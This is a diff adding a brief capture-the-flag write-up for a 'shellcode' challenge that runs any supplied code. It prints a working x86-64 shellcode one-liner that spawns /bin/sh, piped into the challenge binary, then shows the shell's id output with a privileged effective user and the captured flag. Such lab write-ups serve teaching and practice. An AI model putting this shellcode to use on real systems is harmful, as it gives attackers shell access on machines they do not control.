@@ -1,0 +1,9 @@
+Looking at the source, we can see that the program will execute any shellcode we give it.
+
+Let's give it some shellcode that will give us a shell.
+
+team56149@shell:/problems/shellcode$ (python -c "print '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'"; cat) | ./shellcode
+id
+uid=1002(team56149) gid=1000(ctfgroup) euid=1080(shellcode) groups=1003(shellcode),1000(ctfgroup)
+cat flag.txt
+nonexecutable_stack_would_be_a_good_idea
